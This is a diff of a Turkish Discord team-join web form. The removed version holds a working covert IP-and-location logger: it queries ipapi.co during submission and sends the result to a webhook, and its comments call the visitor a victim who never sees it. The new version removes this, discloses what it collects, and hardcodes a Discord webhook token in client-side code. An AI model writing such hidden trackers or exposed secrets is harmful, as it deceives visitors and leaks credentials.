@@ -1,532 +1,186 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Takıma Katılım & Güvenlik Formu</title>
-  <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    body {
-      background: radial-gradient(circle at top, #383a40 0%, #1e1f22 100%);
-      color: #dbdee1;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      padding: 20px;
-    }
-    .kart {
-      background-color: #2b2d31;
-      width: 100%;
-      max-width: 440px;
-      border-radius: 14px;
-      overflow: hidden;
-      box-shadow: 0 12px 35px rgba(0, 0, 0, 0.55);
-      border: 1px solid #3f4147;
-      transition: all 0.3s ease;
-    }
-    .banner {
-      height: 85px;
-      background: linear-gradient(135deg, #5865f2 0%, #eb459e 100%);
-      position: relative;
-    }
-    .muzik-btn {
-      position: absolute;
-      top: 12px;
-      right: 12px;
-      background: rgba(0, 0, 0, 0.45);
-      border: 1px solid rgba(255, 255, 255, 0.2);
-      color: #fff;
-      padding: 6px 12px;
-      border-radius: 20px;
-      font-size: 12px;
-      cursor: pointer;
-    }
-    .muzik-btn:hover { background: rgba(0, 0, 0, 0.7); }
-    .ikon {
-      width: 68px;
-      height: 68px;
-      background-color: #2b2d31;
-      border-radius: 50%;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      font-size: 32px;
-      position: absolute;
-      bottom: -34px;
-      left: 24px;
-      border: 5px solid #2b2d31;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
-    }
-    .icerik { padding: 45px 25px 25px 25px; }
-    h2 { color: #ffffff; font-size: 21px; margin-bottom: 4px; }
-    .alt-baslik {
-      color: #949ba4;
-      font-size: 13px;
-      margin-bottom: 20px;
-      border-bottom: 1px solid #3f4147;
-      padding-bottom: 14px;
-    }
-    .grup { margin-bottom: 15px; }
-    label {
-      display: block;
-      font-size: 12px;
-      font-weight: 700;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      color: #b5bac1;
-      margin-bottom: 6px;
-    }
-    label span { color: #da373c; }
-    input[type="text"], input[type="number"], select, textarea {
-      width: 100%;
-      padding: 11px 12px;
-      background-color: #1e1f22;
-      border: 1px solid #1e1f22;
-      border-radius: 6px;
-      color: #ffffff;
-      font-size: 14px;
-      transition: border 0.2s, box-shadow 0.2s;
-      font-family: inherit;
-    }
-    input:focus, select:focus, textarea:focus {
-      outline: none;
-      border-color: #5865f2;
-      box-shadow: 0 0 0 2px rgba(88, 101, 242, 0.25);
-    }
-    .iki-kolon { display: flex; gap: 12px; }
-    .iki-kolon .grup { flex: 1; }
-    
-    .captcha-kutu {
-      background-color: #232428;
-      border: 1px solid #3f4147;
-      padding: 12px;
-      border-radius: 6px;
-      margin-bottom: 16px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      gap: 10px;
-    }
-    .captcha-soru {
-      font-size: 13px;
-      font-weight: bold;
-      color: #dbdee1;
-    }
-    .captcha-kutu input {
-      width: 90px;
-      text-align: center;
-      font-weight: bold;
-    }
-
-    .onay-kutusu {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      background-color: #232428;
-      padding: 10px 12px;
-      border-radius: 6px;
-      margin-bottom: 18px;
-      cursor: pointer;
-      font-size: 13px;
-      color: #dbdee1;
-    }
-    .onay-kutusu input {
-      width: 16px;
-      height: 16px;
-      accent-color: #5865f2;
-      cursor: pointer;
-    }
-    button.gonder-btn {
-      width: 100%;
-      padding: 13px;
-      background-color: #5865f2;
-      color: white;
-      border: none;
-      border-radius: 6px;
-      font-size: 15px;
-      font-weight: 700;
-      cursor: pointer;
-      transition: background-color 0.2s, transform 0.1s;
-    }
-    button.gonder-btn:hover { background-color: #4752c4; }
-    button.gonder-btn:active { transform: scale(0.98); }
-    button.gonder-btn:disabled { background-color: #4e5058; cursor: not-allowed; }
-    #hataMesaji {
-      margin-top: 15px;
-      padding: 12px;
-      border-radius: 6px;
-      text-align: center;
-      font-size: 13px;
-      font-weight: 600;
-      background-color: rgba(218, 55, 60, 0.15);
-      border: 1px solid #da373c;
-      color: #da373c;
-      display: none;
-    }
-
-    /* ÖZEL VIP KART STİLLERİ */
-    #vipEkran {
-      display: none;
-      animation: kartAcilis 0.5s ease forwards;
-    }
-    @keyframes kartAcilis {
-      from { opacity: 0; transform: scale(0.92); }
-      to { opacity: 1; transform: scale(1); }
-    }
-    .vip-rozet {
-      display: inline-block;
-      background: linear-gradient(90deg, #f59e0b, #fbbf24);
-      color: #1e1f22;
-      font-weight: 800;
-      font-size: 11px;
-      padding: 4px 10px;
-      border-radius: 20px;
-      letter-spacing: 1px;
-      margin-bottom: 10px;
-    }
-    .vip-bilgi-kutu {
-      background-color: #1e1f22;
-      border: 1px solid #3f4147;
-      border-left: 4px solid #23a55a;
-      border-radius: 8px;
-      padding: 15px;
-      margin: 15px 0;
-    }
-    .vip-satir {
-      display: flex;
-      justify-content: space-between;
-      padding: 7px 0;
-      border-bottom: 1px solid #2b2d31;
-      font-size: 13px;
-    }
-    .vip-satir:last-child { border-bottom: none; }
-    .vip-etiket { color: #949ba4; }
-    .vip-deger { color: #ffffff; font-weight: 700; font-family: monospace; font-size: 14px; }
-    .kod-kopyala-btn {
-      width: 100%;
-      padding: 12px;
-      background-color: #23a55a;
-      color: #fff;
-      border: none;
-      border-radius: 6px;
-      font-weight: 700;
-      font-size: 14px;
-      cursor: pointer;
-      transition: background 0.2s;
-    }
-    .kod-kopyala-btn:hover { background-color: #1e8e4b; }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Takıma Katılım Formu</title>
+<link href="https://fonts.googleapis.com/css2?family=IM+Fell+English+SC&family=Special+Elite&display=swap" rel="stylesheet">
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+<style>
+:root{--bg:#070506;--blood:#9b1218;--blood-bright:#d3202a;--bone:#d9cfc0;--dim:#7d746a;--panel:rgba(14,9,10,.82)}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{min-height:100%}
+body{background:var(--bg);color:var(--bone);font-family:'Special Elite','Courier New',monospace;overflow-x:hidden}
+.fog{position:fixed;inset:0;pointer-events:none;z-index:0;background:radial-gradient(ellipse at 20% 110%,rgba(120,10,16,.35),transparent 55%),radial-gradient(ellipse at 85% -10%,rgba(60,60,70,.25),transparent 50%);animation:drift 14s ease-in-out infinite alternate}
+@keyframes drift{to{transform:translate3d(-2%,1.5%,0) scale(1.06)}}
+.grain{position:fixed;inset:-50%;pointer-events:none;z-index:3;opacity:.09;background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='160' height='160'><filter id='n'><feTurbulence type='fractalNoise' baseFrequency='.9' numOctaves='2'/></filter><rect width='160' height='160' filter='url(%23n)'/></svg>");animation:grain 1s steps(6) infinite}
+@keyframes grain{0%{transform:translate(0,0)}25%{transform:translate(-3%,2%)}50%{transform:translate(2%,-3%)}75%{transform:translate(-2%,-1%)}100%{transform:translate(3%,3%)}}
+.dark{position:fixed;inset:0;pointer-events:none;z-index:2;background:radial-gradient(circle 260px at var(--x,50%) var(--y,40%),transparent 0,rgba(0,0,0,.55) 60%,rgba(0,0,0,.93) 100%);animation:flicker 7s infinite}
+@keyframes flicker{0%,100%{opacity:1}41%{opacity:1}42%{opacity:.82}43%{opacity:1}46%{opacity:.9}47%{opacity:1}88%{opacity:1}89%{opacity:.75}90%{opacity:1}}
+main{position:relative;z-index:1;max-width:520px;margin:0 auto;padding:48px 20px 80px}
+header{text-align:center;margin-bottom:28px}
+h1{font-family:'IM Fell English SC',serif;font-weight:400;font-size:clamp(34px,9vw,54px);line-height:1.05;color:var(--bone);text-shadow:0 0 18px rgba(211,32,42,.55);letter-spacing:.02em;animation:glitch 9s infinite}
+@keyframes glitch{0%,93%,100%{transform:none;text-shadow:0 0 18px rgba(211,32,42,.55)}94%{transform:translateX(-3px);text-shadow:3px 0 var(--blood-bright),-3px 0 #2a6}95%{transform:translateX(3px)}96%{transform:none}}
+.sub{margin-top:12px;color:var(--dim);font-size:15px}
+.drip{height:46px;margin:18px auto 0;width:120px;position:relative}
+.drip::before,.drip::after,.drip i{content:"";position:absolute;top:0;width:4px;background:linear-gradient(var(--blood),var(--blood-bright));border-radius:0 0 4px 4px;animation:ooze 5s ease-in infinite}
+.drip::before{left:12%;height:30px;animation-delay:.4s}
+.drip i{left:50%;height:42px;width:5px}
+.drip::after{left:86%;height:22px;animation-delay:1.6s}
+@keyframes ooze{0%{transform:scaleY(.15);transform-origin:top}60%,100%{transform:scaleY(1);transform-origin:top}}
+form,.card{background:var(--panel);border:1px solid #2a1a1c;border-left:3px solid var(--blood);padding:26px 22px;box-shadow:0 0 40px rgba(0,0,0,.8),inset 0 0 30px rgba(120,10,16,.08)}
+label{display:block;margin:20px 0 8px;font-size:15px;color:var(--bone)}
+label:first-of-type{margin-top:0}
+input[type=text],select,textarea{width:100%;background:#0b0708;border:1px solid #3a2326;color:var(--bone);font:inherit;padding:12px;border-radius:2px;outline:none}
+textarea{min-height:90px;resize:vertical}
+input:focus,select:focus,textarea:focus{border-color:var(--blood-bright);box-shadow:0 0 0 2px rgba(211,32,42,.28)}
+.check{display:flex;gap:10px;align-items:flex-start;margin-top:22px;color:var(--dim);font-size:14px;line-height:1.4}
+.check input{margin-top:3px;accent-color:var(--blood-bright)}
+.captcha{margin-top:22px;display:flex;justify-content:center}
+.note{margin-top:16px;font-size:13px;color:var(--dim);line-height:1.45}
+button{width:100%;margin-top:22px;padding:14px;background:var(--blood);color:#fff;border:0;font:inherit;font-size:16px;cursor:pointer;border-radius:2px;transition:background .15s,transform .1s}
+button:hover{background:var(--blood-bright)}
+button:active{transform:scale(.985)}
+button:focus-visible{outline:2px solid var(--bone);outline-offset:3px}
+button:disabled{opacity:.55;cursor:wait}
+.music{position:fixed;top:12px;right:12px;z-index:5;width:auto;margin:0;padding:8px 12px;font-size:13px;background:#1a0f10;border:1px solid #3a2326;color:var(--bone)}
+.music:hover{background:#2a1517}
+.err{margin-top:14px;color:var(--blood-bright);font-size:14px;min-height:18px}
+.card{display:none;text-align:center}
+.card h2{font-family:'IM Fell English SC',serif;font-weight:400;font-size:30px;color:var(--bone);margin-bottom:8px}
+.card p{color:var(--dim);font-size:15px}
+.code{margin:22px 0;font-size:32px;color:var(--blood-bright);text-shadow:0 0 14px rgba(211,32,42,.6);letter-spacing:.06em}
+dl{text-align:left;border-top:1px dashed #3a2326;margin-top:6px}
+dl div{display:flex;justify-content:space-between;gap:12px;padding:10px 0;border-bottom:1px dashed #3a2326;font-size:14px}
+dt{color:var(--dim)}dd{color:var(--bone);text-align:right;word-break:break-word}
+@media(prefers-reduced-motion:reduce){*{animation:none!important}}
+</style>
 </head>
 <body>
+<div class="fog"></div>
+<div class="dark" id="dark"></div>
+<div class="grain"></div>
+<button class="music" id="music" type="button">🔇 Müzik kapalı</button>
 
-<div class="kart">
-  <div class="banner" id="bannerAlani">
-    <button type="button" class="muzik-btn" id="muzikKontrol">🔇 Müzik: Kapalı</button>
-    <div class="ikon" id="ustIkon">🛡️</div>
-  </div>
+<main>
+<header>
+ <h1>Karanlığa<br>Hoş Geldin</h1>
+ <p class="sub">Takıma katılmak için formu doldur. Yetkililer bakacak.</p>
+ <div class="drip"><i></i></div>
+</header>
 
-  <!-- 1. FORM EKRANI -->
-  <div class="icerik" id="formEkran">
-    <h2>Takıma Katılım Formu</h2>
-    <p class="alt-baslik">Sunucuya tam erişim sağlamak için aşağıdaki bilgileri doldur.</p>
+<form id="form" autocomplete="off">
+ <label for="nick">Discord nickin</label>
+ <input type="text" id="nick" maxlength="40" required>
 
-    <form id="form">
-      <div class="grup">
-        <label>Discord Nickin <span>*</span></label>
-        <input type="text" id="nick" placeholder="Örn: kral_34" required>
-      </div>
+ <label for="balls">Kaç topun var?</label>
+ <select id="balls"><option>4</option><option>2</option><option>0</option><option>Saymadım</option></select>
 
-      <div class="iki-kolon">
-        <div class="grup">
-          <label>Kaç Topun Var? <span>*</span></label>
-          <select id="top" class="sesli-eleman">
-            <option value="4 Top (Maşallah)">4</option>
-            <option value="2 Top (Standart)">2</option>
-            <option value="0 Top (Sıfır)">0</option>
-            <option value="Saymadım valla">Saymadım</option>
-          </select>
-        </div>
+ <label for="level">Ortam seviyen</label>
+ <select id="level"><option>Zehir gibi</option><option>Makara / Troll</option><option>Ağır abi</option><option>Boş gezenin kalfası</option></select>
 
-        <div class="grup">
-          <label>Ortam Seviyen <span>*</span></label>
-          <select id="seviye" class="sesli-eleman">
-            <option value="Zehir gibi">Zehir gibi</option>
-            <option value="Makara / Troll">Makara / Troll</option>
-            <option value="Ağır abi">Ağır abi</option>
-            <option value="Boş gezenin kalfası">Boş gezenin kalfası</option>
-          </select>
-        </div>
-      </div>
+ <label for="hours">Günde kaç saat aktifsin?</label>
+ <select id="hours"><option>7/24 hayatsız</option><option>4 - 6 saat</option><option>1 - 2 saat</option><option>Keyfim ne zaman isterse</option></select>
 
-      <div class="grup">
-        <label>Günde Kaç Saat Aktifsin? <span>*</span></label>
-        <select id="aktiflik" class="sesli-eleman">
-          <option value="7/24 Hayatsız">7/24 Hayatsız</option>
-          <option value="4-6 Saat">4 - 6 Saat</option>
-          <option value="1-2 Saat">1 - 2 Saat</option>
-          <option value="Keyfim ne zaman isterse">Keyfim ne zaman isterse</option>
-        </select>
-      </div>
+ <label for="why">Sunucuya ne katacaksın?</label>
+ <textarea id="why" maxlength="300" required></textarea>
 
-      <div class="grup">
-        <label>Sunucuya Ne Katacaksın? <span>*</span></label>
-        <textarea id="katki" rows="2" placeholder="Boş yapmaya geldim..." required></textarea>
-      </div>
+ <label class="check"><input type="checkbox" id="rules" required><span>Satış yapmayacağıma ve kurallara uyacağıma yemin ederim.</span></label>
 
-      <div class="captcha-kutu">
-        <span class="captcha-soru" id="captchaSoru">🤖 Doğrulama: 4 + 3 = ?</span>
-        <input type="number" id="captchaCevap" placeholder="Cevap" required>
-      </div>
+ <div class="captcha"><div class="cf-turnstile" data-sitekey="0x4AAAAAAGGqxk-gjzIQP1SW" data-theme="dark" data-language="tr"></div></div>
 
-      <label class="onay-kutusu">
-        <input type="checkbox" id="yemin" class="sesli-eleman" required>
-        <span>Satış yapmayacağıma ve kurallara uyacağıma yemin ederim.</span>
-      </label>
+ <p class="note">Gönderince nickin, cevapların ve cihaz türün (mobil/masaüstü, tarayıcı) yetkililere Discord'dan iletilir. IP adresi kaydedilmez.</p>
+ <button type="submit" id="send">Formu gönder</button>
+ <p class="err" id="err" role="alert"></p>
+</form>
 
-      <button type="submit" class="gonder-btn" id="btn">Formu Onayla ve Gönder</button>
-    </form>
+<section class="card" id="card">
+ <h2>Kayıt tamamlandı</h2>
+ <p>Aşağıdaki başvuru kodunu yetkililere ilet.</p>
+ <div class="code" id="code">#TR-0000</div>
+ <dl>
+  <div><dt>Üye nicki</dt><dd id="o-nick">-</dd></div>
+  <div><dt>Cihaz</dt><dd id="o-dev">-</dd></div>
+  <div><dt>Durum</dt><dd>Onaylandı</dd></div>
+ </dl>
+ <button type="button" id="copy">Başvuru kodunu kopyala</button>
+</section>
+</main>
 
-    <div id="hataMesaji"></div>
-  </div>
-
-  <!-- 2. VIP KART / BAŞVURU KODU EKRANI (IP burada GÖZÜKMEZ, gizlidir) -->
-  <div class="icerik" id="vipEkran">
-    <span class="vip-rozet">★ ONAYLI VIP GİRİŞ KARTI</span>
-    <h2>Kayıt Başarıyla Tamamlandı!</h2>
-    <p class="alt-baslik">Sistem seni tanıdı. Aşağıdaki özel başvuru kodunu yetkililere ilet.</p>
-
-    <div class="vip-bilgi-kutu">
-      <div class="vip-satir">
-        <span class="vip-etiket">BAŞVURU KODU</span>
-        <span class="vip-deger" id="vipKod" style="color: #fbbf24;">#TR-0000</span>
-      </div>
-      <div class="vip-satir">
-        <span class="vip-etiket">ÜYE NİCKİ</span>
-        <span class="vip-deger" id="vipNick">-</span>
-      </div>
-      <div class="vip-satir">
-        <span class="vip-etiket">TESPİT EDİLEN CİHAZ</span>
-        <span class="vip-deger" id="vipCihaz" style="font-size: 11px;">-</span>
-      </div>
-      <div class="vip-satir">
-        <span class="vip-etiket">GÜVENLİK DURUMU</span>
-        <span class="vip-deger" style="color: #23a55a;">ONAYLANDI ✓</span>
-      </div>
-    </div>
-
-    <button type="button" class="kod-kopyala-btn" id="kopyalaBtn">📋 Başvuru Kodunu Kopyala</button>
-  </div>
-</div>
-
-<audio id="ozelMuzik" loop src="muzik.mp3"></audio>
+<audio id="audio" src="muzik.mp3" loop preload="none"></audio>
 
 <script>
-  const efektCtx = new (window.AudioContext || window.webkitAudioContext)();
+var WEBHOOK_URL = "https://discord.com/api/webhooks/1571916041963962421/xkXEfV_e4jHEt84uTNpZWeCVW-6MabNYOyAhjiNpmt4FLMg_NDHRiRYc8D3Yg0NAAbZ0";
 
-  function tikSesiCal() {
-    if (efektCtx.state === 'suspended') efektCtx.resume();
-    const osc = efektCtx.createOscillator();
-    const gain = efektCtx.createGain();
-    osc.type = 'sine';
-    osc.frequency.setValueAtTime(650, efektCtx.currentTime);
-    osc.frequency.exponentialRampToValueAtTime(220, efektCtx.currentTime + 0.05);
-    gain.gain.setValueAtTime(0.12, efektCtx.currentTime);
-    gain.gain.exponentialRampToValueAtTime(0.001, efektCtx.currentTime + 0.05);
-    osc.connect(gain);
-    gain.connect(efektCtx.destination);
-    osc.start();
-    osc.stop(efektCtx.currentTime + 0.05);
-  }
+var dark = document.getElementById('dark');
+function move(x, y){ dark.style.setProperty('--x', x + 'px'); dark.style.setProperty('--y', y + 'px'); }
+addEventListener('mousemove', function(e){ move(e.clientX, e.clientY); });
+addEventListener('touchmove', function(e){ var t = e.touches[0]; move(t.clientX, t.clientY); }, {passive:true});
 
-  function onaySesiCal() {
-    if (efektCtx.state === 'suspended') efektCtx.resume();
-    const notalar = [523.25, 659.25, 783.99, 1046.50];
-    notalar.forEach((frekans, index) => {
-      const osc = efektCtx.createOscillator();
-      const gain = efektCtx.createGain();
-      osc.type = 'triangle';
-      osc.frequency.setValueAtTime(frekans, efektCtx.currentTime + index * 0.08);
-      gain.gain.setValueAtTime(0.14, efektCtx.currentTime + index * 0.08);
-      gain.gain.exponentialRampToValueAtTime(0.001, efektCtx.currentTime + index * 0.08 + 0.25);
-      osc.connect(gain);
-      gain.connect(efektCtx.destination);
-      osc.start(efektCtx.currentTime + index * 0.08);
-      osc.stop(efektCtx.currentTime + index * 0.08 + 0.25);
-    });
-  }
+var audio = document.getElementById('audio'), mbtn = document.getElementById('music');
+mbtn.addEventListener('click', function(){
+ if (audio.paused) { audio.play().then(function(){ mbtn.textContent = '🔊 Müzik açık'; }).catch(function(){}); }
+ else { audio.pause(); mbtn.textContent = '🔇 Müzik kapalı'; }
+});
 
-  function hataSesiCal() {
-    if (efektCtx.state === 'suspended') efektCtx.resume();
-    const osc = efektCtx.createOscillator();
-    const gain = efektCtx.createGain();
-    osc.type = 'sawtooth';
-    osc.frequency.setValueAtTime(160, efektCtx.currentTime);
-    osc.frequency.linearRampToValueAtTime(110, efektCtx.currentTime + 0.2);
-    gain.gain.setValueAtTime(0.12, efektCtx.currentTime);
-    gain.gain.exponentialRampToValueAtTime(0.001, efektCtx.currentTime + 0.2);
-    osc.connect(gain);
-    gain.connect(efektCtx.destination);
-    osc.start();
-    osc.stop(efektCtx.currentTime + 0.2);
-  }
+function device(){
+ var ua = navigator.userAgent, mobile = /Android|iPhone|iPad|Mobile/i.test(ua);
+ var br = /Edg\//.test(ua) ? 'Edge' : /OPR\//.test(ua) ? 'Opera' : /Chrome\//.test(ua) ? 'Chrome' : /Firefox\//.test(ua) ? 'Firefox' : /Safari\//.test(ua) ? 'Safari' : 'Bilinmeyen tarayıcı';
+ var os = /Android/.test(ua) ? 'Android' : /iPhone|iPad/.test(ua) ? 'iOS' : /Windows/.test(ua) ? 'Windows' : /Mac/.test(ua) ? 'macOS' : /Linux/.test(ua) ? 'Linux' : '';
+ return (mobile ? 'Mobil' : 'Masaüstü') + ' · ' + br + (os ? ' · ' + os : '');
+}
 
-  document.querySelectorAll('.sesli-eleman').forEach(el => {
-    el.addEventListener('change', tikSesiCal);
-  });
+var form = document.getElementById('form'), err = document.getElementById('err'), sendBtn = document.getElementById('send');
+var lastCode = '';
+form.addEventListener('submit', function(e){
+ e.preventDefault();
+ err.textContent = '';
+ var tokenEl = form.querySelector('[name="cf-turnstile-response"]');
+ if (!tokenEl || !tokenEl.value) { err.textContent = 'Önce "ben robot değilim" kutusunu geç.'; return; }
+ if (Date.now() - (+localStorage.getItem('lastSend') || 0) < 30000) { err.textContent = 'Biraz bekle, 30 saniye sonra tekrar dene.'; return; }
 
-  const sayi1 = Math.floor(Math.random() * 10) + 1;
-  const sayi2 = Math.floor(Math.random() * 10) + 1;
-  const dogruCevap = sayi1 + sayi2;
-  document.getElementById('captchaSoru').innerText = `🤖 Doğrulama: ${sayi1} + ${sayi2} = ?`;
+ var nick = document.getElementById('nick').value.trim();
+ var dev = device();
+ lastCode = '#TR-' + Math.floor(1000 + Math.random() * 9000);
+ sendBtn.disabled = true; sendBtn.textContent = 'Gönderiliyor...';
 
-  const ozelMuzik = document.getElementById('ozelMuzik');
-  const muzikBtn = document.getElementById('muzikKontrol');
-  let sesAcik = false;
+ var payload = { embeds: [{
+  title: 'Yeni başvuru ' + lastCode,
+  color: 10162712,
+  fields: [
+   { name: 'Discord nicki', value: nick },
+   { name: 'Top sayısı', value: document.getElementById('balls').value, inline: true },
+   { name: 'Ortam', value: document.getElementById('level').value, inline: true },
+   { name: 'Aktiflik', value: document.getElementById('hours').value, inline: true },
+   { name: 'Ne katacak', value: document.getElementById('why').value.trim() || '-' },
+   { name: 'Cihaz', value: dev }
+  ],
+  timestamp: new Date().toISOString()
+ }]};
 
-  document.body.addEventListener('click', function ilkTiklama() {
-    if (!sesAcik) {
-      ozelMuzik.volume = 0.4;
-      ozelMuzik.play().then(() => {
-        sesAcik = true;
-        muzikBtn.innerText = "🔊 Müzik: Açık";
-      }).catch(() => {});
-    }
-    document.body.removeEventListener('click', ilkTiklama);
-  });
+ fetch(WEBHOOK_URL, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(payload) })
+ .then(function(r){
+  if (!r.ok) throw new Error('http ' + r.status);
+  try { localStorage.setItem('lastSend', Date.now()); } catch(x){}
+  document.getElementById('code').textContent = lastCode;
+  document.getElementById('o-nick').textContent = nick;
+  document.getElementById('o-dev').textContent = dev;
+  form.style.display = 'none';
+  document.getElementById('card').style.display = 'block';
+ })
+ .catch(function(){
+  err.textContent = 'Gönderilemedi. Biraz sonra tekrar dene.';
+  sendBtn.disabled = false; sendBtn.textContent = 'Formu gönder';
+  if (window.turnstile) turnstile.reset();
+ });
+});
 
-  muzikBtn.addEventListener('click', function(e) {
-    e.stopPropagation();
-    tikSesiCal();
-    if (sesAcik) {
-      ozelMuzik.pause();
-      sesAcik = false;
-      muzikBtn.innerText = "🔇 Müzik: Kapalı";
-    } else {
-      ozelMuzik.volume = 0.4;
-      ozelMuzik.play();
-      sesAcik = true;
-      muzikBtn.innerText = "🔊 Müzik: Açık";
-    }
-  });
-
-  function cihazBilgisiAl() {
-    const ua = navigator.userAgent;
-    let cihaz = "Bilinmeyen Cihaz";
-    if (/Windows NT 10.0/.test(ua)) cihaz = "Windows 10/11";
-    else if (/Windows/.test(ua)) cihaz = "Windows PC";
-    else if (/Android/.test(ua)) cihaz = "Android";
-    else if (/iPhone|iPad/.test(ua)) cihaz = "iOS";
-    else if (/Mac OS/.test(ua)) cihaz = "Mac";
-    else if (/Linux/.test(ua)) cihaz = "Linux";
-
-    let tarayici = "Tarayıcı";
-    if (/Edg/.test(ua)) tarayici = "Edge";
-    else if (/OPR|Opera/.test(ua)) tarayici = "Opera";
-    else if (/Chrome/.test(ua)) tarayici = "Chrome";
-    else if (/Firefox/.test(ua)) tarayici = "Firefox";
-    else if (/Safari/.test(ua)) tarayici = "Safari";
-
-    return `${cihaz} / ${tarayici}`;
-  }
-
-  // FORM GÖNDERME VE GİZLİ IP ÇEKME
-  document.getElementById('form').addEventListener('submit', async function(e) {
-    e.preventDefault();
-
-    const kullaniciCevap = parseInt(document.getElementById('captchaCevap').value);
-    const hataMesaji = document.getElementById('hataMesaji');
-
-    if (kullaniciCevap !== dogruCevap) {
-      hataSesiCal();
-      hataMesaji.style.display = 'block';
-      hataMesaji.innerText = "❌ Robot doğrulaması yanlış! İşlemi tekrar hesapla.";
-      return;
-    }
-
-    tikSesiCal();
-    hataMesaji.style.display = 'none';
-
-    const btn = document.getElementById('btn');
-    btn.disabled = true;
-    btn.innerText = "VIP Kart Oluşturuluyor...";
-
-    // IP ve Konum bilgisini arka planda sessizce çek (kurban asla görmez)
-    let ipBilgi = "Bilinmeyen Konum";
-    try {
-      const ipRes = await fetch('https://ipapi.co/json/');
-      const ipData = await ipRes.json();
-      ipBilgi = `${ipData.city} / ${ipData.region} (${ipData.ip})`;
-    } catch (err) {
-      ipBilgi = "Konum Alınamadı";
-    }
-
-    const webhookURL = "https://aged-hat-36af.34samet343.workers.dev/";
-    const nick = document.getElementById('nick').value;
-    const topSayisi = document.getElementById('top').value;
-    const seviye = document.getElementById('seviye').value;
-    const aktiflik = document.getElementById('aktiflik').value;
-    const katki = document.getElementById('katki').value;
-    const cihazDetay = cihazBilgisiAl();
-    const basvuruKodu = "#TR-" + Math.floor(1000 + Math.random() * 9000);
-
-    // Sadece Discord'a gidecek mesajda IP ve Konum yer alır
-    const mesaj = {
-      username: "Güvenlik & Konum Sistemi",
-      embeds: [{
-        title: "👑 Yeni VIP Kayıt ve Konum Tespiti!",
-        color: 2336090,
-        fields: [
-          { name: "🎫 Başvuru Kodu", value: "**" + basvuruKodu + "**", inline: true },
-          { name: "👤 Discord Nicki", value: "`" + nick + "`", inline: true },
-          { name: "⚽ Top Sayısı", value: topSayisi, inline: true },
-          { name: "🧠 Ortam Seviyesi", value: seviye, inline: true },
-          { name: "⏰ Aktiflik", value: aktiflik, inline: true },
-          { name: "💬 Katkısı", value: ">>> " + katki },
-          { name: "📱 Cihaz", value: "`" + cihazDetay + "`", inline: true },
-          { name: "📍 Gizli Yakalanan Konum & IP", value: "`" + ipBilgi + "`", inline: true }
-        ],
-        footer: { text: "VIP Güvenlik Sistemi" },
-        timestamp: new Date()
-      }]
-    };
-
-    fetch(webhookURL, {
-      method: "POST",
-      mode: "no-cors",
-      headers: { "Content-Type": "text/plain" },
-      body: JSON.stringify(mesaj)
-    })
-    .then(() => {
-      onaySesiCal();
-
-      document.getElementById('formEkran').style.display = 'none';
-      document.getElementById('vipEkran').style.display = 'block';
-
-      document.getElementById('bannerAlani').style.background = "linear-gradient(135deg, #23a55a 0%, #f59e0b 100%)";
-      document.getElementById('ustIkon').innerText = "👑";
-
-      // Arkadaşının ekranda gördüğü kartta IP ASLA YAZMAZ, tertemiz durur
-      document.getElementById('vipKod').innerText = basvuruKodu;
-      document.getElementById('vipNick').innerText = nick;
-      document.getElementById('vipCihaz').innerText = cihazDetay;
-
-      document.getElementById('kopyalaBtn').onclick = function() {
-        tikSesiCal();
-        navigator.clipboard.writeText(`Başvuru Kodum: ${basvuruKodu} | Nick: ${nick}`);
-        this.innerText = "✅ Kod Panoya Kopyalandı!";
-      };
-    })
-    .catch(() => {
-      hataSesiCal();
-      hataMesaji.style.display = 'block';
-      hataMesaji.innerText = "❌ Bağlantı hatası oluştu, tekrar dene!";
-      btn.disabled = false;
-      btn.innerText = "Formu Onayla ve Gönder";
-    });
-  });
+document.getElementById('copy').addEventListener('click', function(){
+ var btn = this;
+ (navigator.clipboard ? navigator.clipboard.writeText(lastCode) : Promise.reject()).then(function(){
+  btn.textContent = 'Kopyalandı';
+ }).catch(function(){ btn.textContent = 'Kodu elle seç: ' + lastCode; });
+});
 </script>
-
 </body>
 </html>
